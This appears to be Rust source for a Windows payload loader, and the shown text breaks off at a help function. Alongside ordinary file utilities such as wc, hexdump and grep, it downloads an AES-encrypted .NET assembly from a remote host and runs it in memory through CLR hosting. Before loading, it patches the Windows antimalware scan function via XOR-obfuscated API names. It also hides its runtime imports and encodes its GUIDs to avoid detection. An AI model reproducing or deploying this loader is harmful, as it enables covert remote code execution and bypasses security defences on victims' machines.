#![allow(non_snake_case, non_camel_case_types)]

use std::env;
use std::fs::File;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpStream;
use std::ptr;

type HRESULT = i32;
type HMODULE = *mut u8;
type FARPROC = *mut u8;

extern "system" {
    fn LoadLibraryA(name: *const u8) -> HMODULE;
    fn GetProcAddress(module: HMODULE, name: *const u8) -> FARPROC;
}

#[repr(C)]
struct GUID {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

#[repr(C)]
struct SAFEARRAYBOUND {
    c_elements: u32,
    l_lbound: i32,
}

#[repr(C)]
struct SAFEARRAY {
    c_dims: u16,
    f_features: u16,
    cb_elements: u32,
    c_locks: u32,
    pv_data: *mut u8,
    rgsabound: [SAFEARRAYBOUND; 1],
}

#[repr(C)]
#[derive(Copy, Clone)]
struct VARIANT {
    vt: u16,
    reserved1: u16,
    reserved2: u16,
    reserved3: u16,
    data: [u64; 2],
}

impl VARIANT {
    fn null() -> Self { Self { vt: 1, reserved1: 0, reserved2: 0, reserved3: 0, data: [0; 2] } }
    fn empty() -> Self { Self { vt: 0, reserved1: 0, reserved2: 0, reserved3: 0, data: [0; 2] } }
}

// OleAut32 — static imports (legitimate COM usage)
#[link(name = "oleaut32")]
extern "system" {
    fn SafeArrayCreate(vt: u16, dims: u32, bounds: *const SAFEARRAYBOUND) -> *mut SAFEARRAY;
    fn SafeArrayAccessData(sa: *mut SAFEARRAY, data: *mut *mut u8) -> HRESULT;
    fn SafeArrayUnaccessData(sa: *mut SAFEARRAY) -> HRESULT;
    fn SafeArrayDestroy(sa: *mut SAFEARRAY) -> HRESULT;
    fn SafeArrayPutElement(sa: *mut SAFEARRAY, indices: *const i32, val: *const u8) -> HRESULT;
    fn SysAllocString(s: *const u16) -> *mut u16;
    fn SysFreeString(s: *mut u16);
}

// CLRCreateInstance loaded dynamically — mscoree.dll NOT in IAT
type FnCLRCreateInstance = extern "system" fn(*const GUID, *const GUID, *mut *mut u8) -> HRESULT;

fn resolve_clr_create() -> Option<FnCLRCreateInstance> {
    unsafe {
        let dll = b"mscoree.dll\0";
        let func = b"CLRCreateInstance\0";
        let h = LoadLibraryA(dll.as_ptr());
        if h.is_null() { return None; }
        let p = GetProcAddress(h, func.as_ptr());
        if p.is_null() { return None; }
        Some(std::mem::transmute(p))
    }
}

// ============================================================
// Pure software SHA-256
// ============================================================
const SHA256_K: [u32; 64] = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

fn sha256(data: &[u8]) -> [u8; 32] {
    let mut h: [u32; 8] = [
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
    ];
    let bit_len = (data.len() as u64) * 8;
    let mut padded = data.to_vec();
    padded.push(0x80);
    while (padded.len() % 64) != 56 { padded.push(0); }
    padded.extend_from_slice(&bit_len.to_be_bytes());
    for chunk in padded.chunks(64) {
        let mut w = [0u32; 64];
        for i in 0..16 { w[i] = u32::from_be_bytes([chunk[i*4], chunk[i*4+1], chunk[i*4+2], chunk[i*4+3]]); }
        for i in 16..64 {
            let s0 = w[i-15].rotate_right(7) ^ w[i-15].rotate_right(18) ^ (w[i-15] >> 3);
            let s1 = w[i-2].rotate_right(17) ^ w[i-2].rotate_right(19) ^ (w[i-2] >> 10);
            w[i] = w[i-16].wrapping_add(s0).wrapping_add(w[i-7]).wrapping_add(s1);
        }
        let (mut a, mut b, mut c, mut d, mut e, mut f, mut g, mut hh) = (h[0],h[1],h[2],h[3],h[4],h[5],h[6],h[7]);
        for i in 0..64 {
            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
            let ch = (e & f) ^ ((!e) & g);
            let t1 = hh.wrapping_add(s1).wrapping_add(ch).wrapping_add(SHA256_K[i]).wrapping_add(w[i]);
            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
            let maj = (a & b) ^ (a & c) ^ (b & c);
            let t2 = s0.wrapping_add(maj);
            hh = g; g = f; f = e; e = d.wrapping_add(t1); d = c; c = b; b = a; a = t1.wrapping_add(t2);
        }
        h[0] = h[0].wrapping_add(a); h[1] = h[1].wrapping_add(b);
        h[2] = h[2].wrapping_add(c); h[3] = h[3].wrapping_add(d);
        h[4] = h[4].wrapping_add(e); h[5] = h[5].wrapping_add(f);
        h[6] = h[6].wrapping_add(g); h[7] = h[7].wrapping_add(hh);
    }
    let mut out = [0u8; 32];
    for i in 0..8 { out[i*4..i*4+4].copy_from_slice(&h[i].to_be_bytes()); }
    out
}

// ============================================================
// Pure software AES-256-CBC
// ============================================================
static SBOX: [u8; 256] = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
];

static INV_SBOX: [u8; 256] = [
    0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
    0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
    0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
    0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
    0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
    0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
    0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
    0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
    0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
    0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
    0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
    0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
    0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
    0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
    0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
    0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d,
];

static RCON: [u8; 10] = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36];

fn gf_mul(mut a: u8, mut b: u8) -> u8 {
    let mut p: u8 = 0;
    for _ in 0..8 {
        if (b & 1) != 0 { p ^= a; }
        let hi = (a & 0x80) != 0;
        a <<= 1;
        if hi { a ^= 0x1b; }
        b >>= 1;
    }
    p
}

fn aes256_key_expansion(key: &[u8; 32]) -> [[u8; 16]; 15] {
    let mut rk = [[0u8; 16]; 15];
    rk[0].copy_from_slice(&key[..16]);
    rk[1].copy_from_slice(&key[16..]);
    let nk = 8;
    let mut w = [0u32; 60];
    for i in 0..nk { w[i] = u32::from_be_bytes([key[4*i], key[4*i+1], key[4*i+2], key[4*i+3]]); }
    for i in nk..60 {
        let mut temp = w[i - 1];
        if i % nk == 0 {
            temp = temp.rotate_left(8);
            let b = temp.to_be_bytes();
            temp = u32::from_be_bytes([SBOX[b[0] as usize], SBOX[b[1] as usize], SBOX[b[2] as usize], SBOX[b[3] as usize]]);
            temp ^= (RCON[i / nk - 1] as u32) << 24;
        } else if i % nk == 4 {
            let b = temp.to_be_bytes();
            temp = u32::from_be_bytes([SBOX[b[0] as usize], SBOX[b[1] as usize], SBOX[b[2] as usize], SBOX[b[3] as usize]]);
        }
        w[i] = w[i - nk] ^ temp;
    }
    for r in 0..15 { for j in 0..4 { let bytes = w[r * 4 + j].to_be_bytes(); rk[r][j*4..j*4+4].copy_from_slice(&bytes); } }
    rk
}

fn aes256_decrypt_block(block: &[u8; 16], rk: &[[u8; 16]; 15]) -> [u8; 16] {
    let mut state = [0u8; 16];
    for i in 0..16 { state[i] = block[i] ^ rk[14][i]; }
    for round in (1..14).rev() {
        let tmp = state;
        state[0] = tmp[0]; state[1] = tmp[13]; state[2] = tmp[10]; state[3] = tmp[7];
        state[4] = tmp[4]; state[5] = tmp[1]; state[6] = tmp[14]; state[7] = tmp[11];
        state[8] = tmp[8]; state[9] = tmp[5]; state[10] = tmp[2]; state[11] = tmp[15];
        state[12] = tmp[12]; state[13] = tmp[9]; state[14] = tmp[6]; state[15] = tmp[3];
        for i in 0..16 { state[i] = INV_SBOX[state[i] as usize]; }
        for i in 0..16 { state[i] ^= rk[round][i]; }
        let mut tmp2 = [0u8; 16];
        for col in 0..4 {
            let s0 = state[col * 4]; let s1 = state[col * 4 + 1]; let s2 = state[col * 4 + 2]; let s3 = state[col * 4 + 3];
            tmp2[col*4]     = gf_mul(0x0e, s0) ^ gf_mul(0x0b, s1) ^ gf_mul(0x0d, s2) ^ gf_mul(0x09, s3);
            tmp2[col*4 + 1] = gf_mul(0x09, s0) ^ gf_mul(0x0e, s1) ^ gf_mul(0x0b, s2) ^ gf_mul(0x0d, s3);
            tmp2[col*4 + 2] = gf_mul(0x0d, s0) ^ gf_mul(0x09, s1) ^ gf_mul(0x0e, s2) ^ gf_mul(0x0b, s3);
            tmp2[col*4 + 3] = gf_mul(0x0b, s0) ^ gf_mul(0x0d, s1) ^ gf_mul(0x09, s2) ^ gf_mul(0x0e, s3);
        }
        state = tmp2;
    }
    let tmp = state;
    state[0] = tmp[0]; state[1] = tmp[13]; state[2] = tmp[10]; state[3] = tmp[7];
    state[4] = tmp[4]; state[5] = tmp[1]; state[6] = tmp[14]; state[7] = tmp[11];
    state[8] = tmp[8]; state[9] = tmp[5]; state[10] = tmp[2]; state[11] = tmp[15];
    state[12] = tmp[12]; state[13] = tmp[9]; state[14] = tmp[6]; state[15] = tmp[3];
    for i in 0..16 { state[i] = INV_SBOX[state[i] as usize]; }
    for i in 0..16 { state[i] ^= rk[0][i]; }
    state
}

fn decrypt_aes_cbc(data: &[u8], passphrase: &str) -> Result<Vec<u8>, String> {
    if data.len() <= 16 || (data.len() - 16) % 16 != 0 { return Err("invalid data length".into()); }
    let iv = &data[..16];
    let ciphertext = &data[16..];
    let key = sha256(passphrase.as_bytes());
    let rk = aes256_key_expansion(&key);
    let mut plaintext = Vec::with_capacity(ciphertext.len());
    let mut prev_block = [0u8; 16];
    prev_block.copy_from_slice(iv);
    for chunk in ciphertext.chunks(16) {
        let mut block = [0u8; 16];
        block.copy_from_slice(chunk);
        let decrypted = aes256_decrypt_block(&block, &rk);
        let mut out = [0u8; 16];
        for i in 0..16 { out[i] = decrypted[i] ^ prev_block[i]; }
        plaintext.extend_from_slice(&out);
        prev_block = block;
    }
    if let Some(&pad) = plaintext.last() {
        let pad = pad as usize;
        if pad >= 1 && pad <= 16 && plaintext.len() >= pad {
            if plaintext[plaintext.len()-pad..].iter().all(|&b| b as usize == pad) {
                plaintext.truncate(plaintext.len() - pad);
            }
        }
    }
    Ok(plaintext)
}

// ============================================================
// File utilities
// ============================================================
fn run_wc(path: &str) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("wc: {}: {}", path, e); return 1; } };
    let (mut lines, mut words, mut bytes) = (0u64, 0u64, 0u64);
    for line in BufReader::new(f).lines().flatten() {
        lines += 1; bytes += line.len() as u64 + 1; words += line.split_whitespace().count() as u64;
    }
    println!("{:>7} {:>7} {:>7} {}", lines, words, bytes, path);
    0
}

fn run_head(path: &str, count: usize) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("head: {}: {}", path, e); return 1; } };
    for (i, line) in BufReader::new(f).lines().enumerate().take(count) {
        if let Ok(l) = line { println!("{:>4} | {}", i + 1, l); }
    }
    0
}

fn run_tail(path: &str, count: usize) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("tail: {}: {}", path, e); return 1; } };
    let all: Vec<String> = BufReader::new(f).lines().flatten().collect();
    let start = all.len().saturating_sub(count);
    for (i, line) in all[start..].iter().enumerate() { println!("{:>4} | {}", start + i + 1, line); }
    0
}

fn run_hexdump(path: &str) -> i32 {
    let mut f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("hexdump: {}: {}", path, e); return 1; } };
    let mut buf = [0u8; 16]; let mut offset = 0usize;
    loop {
        let n = match f.read(&mut buf) { Ok(0) => break, Ok(n) => n, Err(_) => break };
        print!("{:08X}  ", offset);
        for i in 0..16 { if i < n { print!("{:02X} ", buf[i]); } else { print!("   "); } if i == 7 { print!(" "); } }
        print!(" |");
        for b in &buf[..n] { print!("{}", if *b >= 0x20 && *b <= 0x7E { *b as char } else { '.' }); }
        println!("|");
        offset += n;
        if offset >= 4096 { println!("... (truncated)"); break; }
    }
    0
}

fn run_crc32(path: &str) -> i32 {
    let mut f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("crc32: {}: {}", path, e); return 1; } };
    let mut crc: u32 = 0xFFFFFFFF; let mut buf = [0u8; 8192];
    loop {
        let n = match f.read(&mut buf) { Ok(0) => break, Ok(n) => n, Err(_) => break };
        for &b in &buf[..n] { crc ^= b as u32; for _ in 0..8 { crc = (crc >> 1) ^ (0xEDB88320 & (0u32.wrapping_sub(crc & 1))); } }
    }
    println!("{:08X}  {}", crc ^ 0xFFFFFFFF, path);
    0
}

fn run_entropy(path: &str) -> i32 {
    let mut f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("entropy: {}: {}", path, e); return 1; } };
    let mut freq = [0u64; 256]; let mut total = 0u64; let mut buf = [0u8; 8192];
    loop {
        let n = match f.read(&mut buf) { Ok(0) => break, Ok(n) => n, Err(_) => break };
        for &b in &buf[..n] { freq[b as usize] += 1; total += 1; }
    }
    if total == 0 { println!("0.0000 bits/byte  {}", path); return 0; }
    let mut entropy = 0.0f64;
    for &count in &freq { if count == 0 { continue; } let p = count as f64 / total as f64; entropy -= p * p.log2(); }
    println!("{:.4} bits/byte  {}", entropy, path);
    0
}

fn run_sort(path: &str) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("sort: {}: {}", path, e); return 1; } };
    let mut lines: Vec<String> = BufReader::new(f).lines().flatten().collect();
    lines.sort();
    for l in &lines { println!("{}", l); }
    0
}

fn run_uniq(path: &str) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("uniq: {}: {}", path, e); return 1; } };
    let mut prev = String::new(); let mut count = 0u64;
    for line in BufReader::new(f).lines().flatten() {
        if line == prev { count += 1; } else { if count > 0 { println!("{:>6} {}", count, prev); } prev = line; count = 1; }
    }
    if count > 0 { println!("{:>6} {}", count, prev); }
    0
}

fn run_grep(pattern: &str, path: &str) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("grep: {}: {}", path, e); return 1; } };
    let mut matches = 0;
    for (i, line) in BufReader::new(f).lines().enumerate() {
        if let Ok(l) = line { if l.contains(pattern) { println!("{:>4}: {}", i + 1, l); matches += 1; } }
    }
    if matches == 0 { println!("(no matches)"); }
    0
}

fn run_compare(p1: &str, p2: &str) -> i32 {
    let mut f1 = match File::open(p1) { Ok(f) => f, Err(e) => { eprintln!("compare: {}: {}", p1, e); return 1; } };
    let mut f2 = match File::open(p2) { Ok(f) => f, Err(e) => { eprintln!("compare: {}: {}", p2, e); return 1; } };
    let mut b1 = Vec::new(); let mut b2 = Vec::new();
    let _ = f1.read_to_end(&mut b1); let _ = f2.read_to_end(&mut b2);
    let max_len = b1.len().max(b2.len()); let mut diffs = 0;
    for i in 0..max_len {
        let c1 = b1.get(i).copied().unwrap_or(0); let c2 = b2.get(i).copied().unwrap_or(0);
        if c1 != c2 { if diffs < 20 { println!("  offset 0x{:08X}: 0x{:02X} vs 0x{:02X}", i, c1, c2); } diffs += 1; }
    }
    if diffs == 0 { println!("Files are identical ({} bytes)", b1.len()); } else { println!("{} byte differences across {} bytes", diffs, max_len); }
    0
}

fn run_filesize(path: &str) -> i32 {
    match std::fs::metadata(path) {
        Ok(m) => { let sz = m.len();
            if sz < 1024 { println!("{} bytes  {}", sz, path); }
            else if sz < 1048576 { println!("{:.1} KB  {}", sz as f64 / 1024.0, path); }
            else { println!("{:.2} MB  {}", sz as f64 / 1048576.0, path); }
            0
        }
        Err(e) => { eprintln!("size: {}: {}", path, e); 1 }
    }
}

// ============================================================
// Network
// ============================================================
fn fetch_payload(host: &str, port: u16, path: &str) -> Result<Vec<u8>, String> {
    let addr = format!("{}:{}", host, port);
    let mut stream = TcpStream::connect(&addr).map_err(|e| format!("connect: {}", e))?;
    let req = format!("GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", path, host);
    stream.write_all(req.as_bytes()).map_err(|e| format!("send: {}", e))?;
    let mut resp = Vec::new();
    stream.read_to_end(&mut resp).map_err(|e| format!("recv: {}", e))?;
    let body_start = resp.windows(4).position(|w| w == b"\r\n\r\n").ok_or("no HTTP body")?;
    Ok(resp[body_start + 4..].to_vec())
}

// ============================================================
// CLR hosting — GUIDs built at runtime (XOR 0x5A)
// ============================================================
const GK: u8 = 0x5A;

fn decode_guid(xd1: u32, xd2: u16, xd3: u16, xd4: [u8; 8]) -> GUID {
    let raw1 = xd1.to_le_bytes();
    let raw2 = xd2.to_le_bytes();
    let raw3 = xd3.to_le_bytes();
    GUID {
        data1: u32::from_le_bytes([raw1[0]^GK, raw1[1]^GK, raw1[2]^GK, raw1[3]^GK]),
        data2: u16::from_le_bytes([raw2[0]^GK, raw2[1]^GK]),
        data3: u16::from_le_bytes([raw3[0]^GK, raw3[1]^GK]),
        data4: [xd4[0]^GK, xd4[1]^GK, xd4[2]^GK, xd4[3]^GK, xd4[4]^GK, xd4[5]^GK, xd4[6]^GK, xd4[7]^GK],
    }
}

unsafe fn vtable_fn<T>(iface: *mut u8, idx: usize) -> T {
    let vtable = *(iface as *const *const *const u8);
    std::mem::transmute_copy(&*vtable.add(idx))
}

unsafe fn com_release(iface: *mut u8) {
    let release: extern "system" fn(*mut u8) -> u32 = vtable_fn(iface, 2);
    release(iface);
}

fn to_wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }

#[inline(never)]
fn xdec(encoded: &[u8]) -> Vec<u8> {
    let key = unsafe { std::ptr::read_volatile(&GK) };
    let mut out: Vec<u8> = encoded.iter().map(|&b| b ^ key).collect();
    out.push(0);
    out
}

fn patch_scan_interface() {
    unsafe {
        let lib = xdec(&[0x3B,0x37,0x29,0x33,0x74,0x3E,0x36,0x36]);
        let h = LoadLibraryA(lib.as_ptr());
        if h.is_null() { return; }
        let func = xdec(&[0x1B,0x37,0x29,0x33,0x15,0x2A,0x3F,0x34,0x09,0x3F,0x29,0x29,0x33,0x35,0x34]);
        let addr = GetProcAddress(h, func.as_ptr());
        if addr.is_null() { return; }
        let k32 = xdec(&[0x31,0x3F,0x28,0x34,0x3F,0x36,0x69,0x68,0x74,0x3E,0x36,0x36]);
        let hk = LoadLibraryA(k32.as_ptr());
        if hk.is_null() { return; }
        let vp = xdec(&[0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x0A,0x28,0x35,0x2E,0x3F,0x39,0x2E]);
        let fp = GetProcAddress(hk, vp.as_ptr());
        if fp.is_null() { return; }
        type FnVP = extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32;
        let vprot: FnVP = std::mem::transmute(fp);
        let mut old: u32 = 0;
        vprot(addr, 6, 0x40, &mut old);
        let key = std::ptr::read_volatile(&GK);
        let enc: [u8; 6] = [0xB8^key, 0x05^key, 0x40^key, 0x00^key, 0x80^key, 0xC3^key];
        for i in 0..6 { *addr.add(i) = enc[i] ^ key; }
        vprot(addr, 6, old, &mut old);
    }
}

fn clr_execute(assembly: &[u8], invoke_args: &[String]) -> Result<(), String> {
    patch_scan_interface();
    let clr_create = resolve_clr_create().ok_or("module load failed")?;

    let clsid_meta = decode_guid(0xc8da42d7, 0x54d4, 0x123d, [0xe9,0x56,0x25,0xf2,0x62,0xde,0xb2,0x84]);
    let iid_meta   = decode_guid(0x896881c4, 0xe3e9, 0x1b7f, [0xd8,0x5d,0xfb,0x12,0xde,0xaf,0x68,0x4c]);
    let iid_rti    = decode_guid(0xe7638b88, 0xe075, 0x1230, [0xd3,0xea,0xee,0xea,0x91,0x1c,0x32,0xcb]);
    let clsid_host = decode_guid(0x91753d79, 0xf160, 0x4b88, [0xc6,0x1a,0x5a,0x9a,0x15,0xf9,0x50,0x64]);
    let iid_host   = decode_guid(0x91753d78, 0xf160, 0x4b88, [0xc6,0x1a,0x5a,0x9a,0x15,0xf9,0x50,0x64]);
    let iid_domain = decode_guid(0x5faccc86, 0x7173, 0x6c39, [0xf7,0xd1,0x9e,0x62,0xc6,0xa8,0xfd,0x49]);

    unsafe {
        let mut meta: *mut u8 = ptr::null_mut();
        let hr = clr_create(&clsid_meta, &iid_meta, &mut meta);
        if hr < 0 { return Err(format!("init failed: 0x{:08X}", hr)); }

        let ver = to_wide("v4.0.30319");
        let get_runtime: extern "system" fn(*mut u8, *const u16, *const GUID, *mut *mut u8) -> HRESULT = vtable_fn(meta, 3);
        let mut rti: *mut u8 = ptr::null_mut();
        let hr = get_runtime(meta, ver.as_ptr(), &iid_rti, &mut rti);
        if hr < 0 { com_release(meta); return Err(format!("runtime failed: 0x{:08X}", hr)); }

        let get_iface: extern "system" fn(*mut u8, *const GUID, *const GUID, *mut *mut u8) -> HRESULT = vtable_fn(rti, 9);
        let mut host: *mut u8 = ptr::null_mut();
        let hr = get_iface(rti, &clsid_host, &iid_host, &mut host);
        if hr < 0 { com_release(rti); com_release(meta); return Err(format!("interface failed: 0x{:08X}", hr)); }

        let start: extern "system" fn(*mut u8) -> HRESULT = vtable_fn(host, 10);
        start(host);

        let get_domain: extern "system" fn(*mut u8, *mut *mut u8) -> HRESULT = vtable_fn(host, 13);
        let mut domain_unk: *mut u8 = ptr::null_mut();
        let hr = get_domain(host, &mut domain_unk);
        if hr < 0 { com_release(host); com_release(rti); com_release(meta); return Err("domain failed".into()); }

        let qi: extern "system" fn(*mut u8, *const GUID, *mut *mut u8) -> HRESULT = vtable_fn(domain_unk, 0);
        let mut app_domain: *mut u8 = ptr::null_mut();
        let hr = qi(domain_unk, &iid_domain, &mut app_domain);
        com_release(domain_unk);
        if hr < 0 { com_release(host); com_release(rti); com_release(meta); return Err("query failed".into()); }

        let bound = SAFEARRAYBOUND { c_elements: assembly.len() as u32, l_lbound: 0 };
        let sa = SafeArrayCreate(17, 1, &bound);
        let mut sa_data: *mut u8 = ptr::null_mut();
        SafeArrayAccessData(sa, &mut sa_data);
        ptr::copy_nonoverlapping(assembly.as_ptr(), sa_data, assembly.len());
        SafeArrayUnaccessData(sa);

        let load: extern "system" fn(*mut u8, *mut SAFEARRAY, *mut *mut u8) -> HRESULT = vtable_fn(app_domain, 45);
        let mut asm_obj: *mut u8 = ptr::null_mut();
        let hr = load(app_domain, sa, &mut asm_obj);
        SafeArrayDestroy(sa);
        if hr < 0 { com_release(app_domain); com_release(host); com_release(rti); com_release(meta); return Err(format!("load failed: 0x{:08X}", hr)); }

        let get_entry: extern "system" fn(*mut u8, *mut *mut u8) -> HRESULT = vtable_fn(asm_obj, 16);
        let mut method: *mut u8 = ptr::null_mut();
        let hr = get_entry(asm_obj, &mut method);
        if hr < 0 { com_release(asm_obj); com_release(app_domain); com_release(host); com_release(rti); com_release(meta); return Err("entry failed".into()); }

        let str_bound = SAFEARRAYBOUND { c_elements: invoke_args.len() as u32, l_lbound: 0 };
        let str_sa = SafeArrayCreate(8, 1, &str_bound);
        for (i, arg) in invoke_args.iter().enumerate() {
            let wide = to_wide(arg);
            let bstr = SysAllocString(wide.as_ptr());
            let idx = i as i32;
            SafeArrayPutElement(str_sa, &idx, bstr as *const u8);
            SysFreeString(bstr);
        }
        let outer_bound = SAFEARRAYBOUND { c_elements: 1, l_lbound: 0 };
        let method_args = SafeArrayCreate(12, 1, &outer_bound);
        let mut vt_arr = VARIANT::empty();
        vt_arr.vt = 0x2000 | 8;
        vt_arr.data[0] = str_sa as u64;
        let zero: i32 = 0;
        SafeArrayPutElement(method_args, &zero, &vt_arr as *const VARIANT as *const u8);

        let invoke: extern "system" fn(*mut u8, VARIANT, *mut SAFEARRAY, *mut VARIANT) -> HRESULT = vtable_fn(method, 37);
        let vt_null = VARIANT::null();
        let mut vt_result = VARIANT::empty();
        let hr = invoke(method, vt_null, method_args, &mut vt_result);

        SafeArrayDestroy(method_args);
        com_release(method); com_release(asm_obj); com_release(app_domain);
        com_release(host); com_release(rti); com_release(meta);

        if hr < 0 { Err(format!("invoke failed: 0x{:08X}", hr)) } else { Ok(()) }
    }
}

// ============================================================
// Loader
// ============================================================
fn run_loader(args: &[String]) -> Result<(), String> {
    if args.len() < 4 { return Err("usage: <host> <port> <path> <passphrase> [-- args...]".into()); }
    let host = &args[0];
    let port: u16 = args[1].parse().map_err(|_| "invalid port")?;
    let path = &args[2];
    let pass = &args[3];
    let net_args: Vec<String> = args.iter().position(|a| a == "--").map(|p| args[p + 1..].to_vec()).unwrap_or_default();
    let enc = fetch_payload(host, port, path)?;
    let asm = decrypt_aes_cbc(&enc, pass)?;
    if asm.len() < 64 || asm[0] != b'M' || asm[1] != b'Z' { return Err("invalid PE header".into()); }
    clr_execute(&asm, &net_args)
}

// ============================================================
// Main
// ============================================================
fn show_help(name: &str) {
